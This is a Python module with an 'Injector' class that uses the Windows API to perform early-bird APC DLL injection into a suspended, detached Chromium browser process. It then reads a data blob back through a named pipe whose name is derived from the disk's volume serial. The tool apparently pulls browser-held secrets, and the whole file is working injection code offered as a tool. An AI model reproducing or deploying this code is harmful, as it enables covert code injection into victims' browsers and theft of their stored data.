import ctypes
import struct
import time
import os
from ctypes import wintypes
from typing import Optional, List
from .config import BUFFER_SIZE_8192, STR_CHROMIUM_ARGS, PIPE_THREAD_TIMEOUT

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
CREATE_SUSPENDED = 0x00000004
DETACHED_PROCESS = 0x00000008
EXTENDED_STARTUPINFO_PRESENT = 0x00080000
PIPE_ACCESS_INBOUND = 0x00000001
PIPE_TYPE_BYTE = 0x00000000
PIPE_READMODE_BYTE = 0x00000000
PIPE_WAIT = 0x00000000
PIPE_UNLIMITED_INSTANCES = 255
INVALID_HANDLE_VALUE = -1

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ('cb', wintypes.DWORD),
        ('lpReserved', wintypes.LPWSTR),
        ('lpDesktop', wintypes.LPWSTR),
        ('lpTitle', wintypes.LPWSTR),
        ('dwX', wintypes.DWORD),
        ('dwY', wintypes.DWORD),
        ('dwXSize', wintypes.DWORD),
        ('dwYSize', wintypes.DWORD),
        ('dwXCountChars', wintypes.DWORD),
        ('dwYCountChars', wintypes.DWORD),
        ('dwFillAttribute', wintypes.DWORD),
        ('dwFlags', wintypes.DWORD),
        ('wShowWindow', wintypes.WORD),
        ('cbReserved2', wintypes.WORD),
        ('lpReserved2', ctypes.POINTER(ctypes.c_byte)),
        ('hStdInput', wintypes.HANDLE),
        ('hStdOutput', wintypes.HANDLE),
        ('hStdError', wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('hProcess', wintypes.HANDLE),
        ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD),
        ('dwThreadId', wintypes.DWORD),
    ]

class Injector:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.advapi32 = ctypes.windll.advapi32

        # Define 64-bit compatible signatures
        self.kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
        self.kernel32.VirtualAllocEx.restype = ctypes.c_void_p
        
        self.kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
        self.kernel32.WriteProcessMemory.restype = wintypes.BOOL
        
        # QueueUserAPC: (PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData)
        # ULONG_PTR is 64-bit on x64
        self.kernel32.QueueUserAPC.argtypes = [ctypes.c_void_p, wintypes.HANDLE, ctypes.c_void_p]
        self.kernel32.QueueUserAPC.restype = wintypes.DWORD

        self.kernel32.GetModuleHandleW.argtypes = [wintypes.LPWSTR]
        self.kernel32.GetModuleHandleW.restype = wintypes.HMODULE

        self.kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, ctypes.c_char_p]
        self.kernel32.GetProcAddress.restype = ctypes.c_void_p

    def get_pipe_name(self) -> str:
        # Replicates the GetPipeName logic from Common.h to match the DLL
        try:
            import win32api
            # GetVolumeInformation returns tuple, index 1 is serial
            serial_num = win32api.GetVolumeInformation("C:\\")[1]
        except Exception as e:
            print(f"[!] Failed to get volume information: {e}")
            serial_num = 0

        # Ensure unsigned 32-bit
        dw_serial = serial_num & 0xFFFFFFFF
        
        dw_state1 = 0x5EED1234
        dw_state1 ^= dw_serial
        dw_state1 &= 0xFFFFFFFF

        # First loop (16 iterations)
        for _ in range(16):
            dw_state1 ^= (dw_state1 << 13)
            dw_state1 &= 0xFFFFFFFF
            dw_state1 ^= (dw_state1 >> 17) # Logical shift for unsigned
            dw_state1 &= 0xFFFFFFFF
            dw_state1 ^= (dw_state1 << 5)
            dw_state1 &= 0xFFFFFFFF
        
        dw_state2 = dw_state1

        # Second loop (16 iterations)
        for _ in range(16):
            dw_state2 ^= (dw_state2 << 13)
            dw_state2 &= 0xFFFFFFFF
            dw_state2 ^= (dw_state2 >> 17)
            dw_state2 &= 0xFFFFFFFF
            dw_state2 ^= (dw_state2 << 5)
            dw_state2 &= 0xFFFFFFFF
            
        return f"\\\\.\\pipe\\{dw_state1:08X}{dw_state2:08X}"

    def inject_dll_via_early_bird(self, browser_path: str, dll_path: str) -> Optional[bytes]:
        """
        Injects DLL into a suspended browser process and retrieves data from named pipe.
        Returns the raw data blob read from the pipe.
        """
        if not os.path.exists(browser_path) or not os.path.exists(dll_path):
            print(f"[!] Invalid path: {browser_path} or {dll_path}")
            return None

        pipe_name = self.get_pipe_name()
        
        # 1. Create Named Pipe
        h_pipe = self.kernel32.CreateNamedPipeW(
            pipe_name,
            PIPE_ACCESS_INBOUND,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            255, # Max instances
            BUFFER_SIZE_8192,
            BUFFER_SIZE_8192,
            0,
            None
        )

        if h_pipe == INVALID_HANDLE_VALUE:
            print(f"[!] CreateNamedPipe Failed. Error: {self.kernel32.GetLastError()}")
            return None

        print(f"[+] Pipe Created: {pipe_name}")

        # 2. Create Suspended Process
        si = STARTUPINFOW()
        si.cb = ctypes.sizeof(STARTUPINFOW)
        pi = PROCESS_INFORMATION()
        
        # Redirect stdout/err to NUL to avoid noise
        # (Skipping handle redirection implementation for brevity, relying on detach)
        
        cmd_line = f'"{browser_path}" {STR_CHROMIUM_ARGS}'
        
        success = self.kernel32.CreateProcessW(
            None,
            cmd_line,
            None,
            None,
            False,
            CREATE_SUSPENDED | DETACHED_PROCESS,
            None,
            None,
            ctypes.byref(si),
            ctypes.byref(pi)
        )

        if not success:
            print(f"[!] CreateProcess Failed: {ctypes.get_last_error()}")
            self.kernel32.CloseHandle(h_pipe)
            return None

        print(f"[+] Created Process: {pi.dwProcessId}")

        try:
            # 3. Write DLL path to target memory
            dll_path_bytes = (dll_path + "\0").encode('utf-16le')
            remote_mem = self.kernel32.VirtualAllocEx(
                pi.hProcess,
                None,
                len(dll_path_bytes),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            )

            if not remote_mem:
                print("[!] VirtualAllocEx Failed")
                return None

            written = ctypes.c_size_t(0)
            self.kernel32.WriteProcessMemory(
                pi.hProcess,
                ctypes.c_void_p(remote_mem),
                dll_path_bytes,
                len(dll_path_bytes),
                ctypes.byref(written)
            )

            # 4. Queue APC
            load_library = self.kernel32.GetProcAddress(self.kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryW")
            
            if not self.kernel32.QueueUserAPC(ctypes.c_void_p(load_library), pi.hThread, ctypes.c_void_p(remote_mem)):
                print("[!] QueueUserAPC Failed")
                return None

            # 5. Resume Thread
            self.kernel32.ResumeThread(pi.hThread)
            
            # 6. Wait for connection
            print("[+] Waiting for DLL to connect...")
            
            # Using ConnectNamedPipe in a blocking mode since we set PIPE_WAIT
            # In a real async scenario we'd use overlapped, but here we can block momentarily
            connected = self.kernel32.ConnectNamedPipe(h_pipe, None)
            if not connected and self.kernel32.GetLastError() != 535: # ERROR_PIPE_CONNECTED
                 # On some versions it returns 0 if client connects before call, but GetLastError handles it.
                 # Standard check:
                 pass

            print("[+] Connected! Reading data...")
            
            # 7. Read Data
            received_data = bytearray()
            buffer = ctypes.create_string_buffer(BUFFER_SIZE_8192)
            bytes_read = wintypes.DWORD(0)
            
            # Read loop
            start_time = time.time()
            while True:
                if time.time() - start_time > (PIPE_THREAD_TIMEOUT / 1000):
                    print("[!] Timeout reading from pipe")
                    break

                success = self.kernel32.ReadFile(
                    h_pipe,
                    buffer,
                    BUFFER_SIZE_8192,
                    ctypes.byref(bytes_read),
                    None
                )
                
                if success and bytes_read.value > 0:
                    received_data.extend(buffer.raw[:bytes_read.value])
                else:
                    break # Pipe broken or finished

            return bytes(received_data)

        finally:
            self.kernel32.TerminateProcess(pi.hProcess, 0)
            self.kernel32.CloseHandle(pi.hProcess)
            self.kernel32.CloseHandle(pi.hThread)
            self.kernel32.CloseHandle(h_pipe)
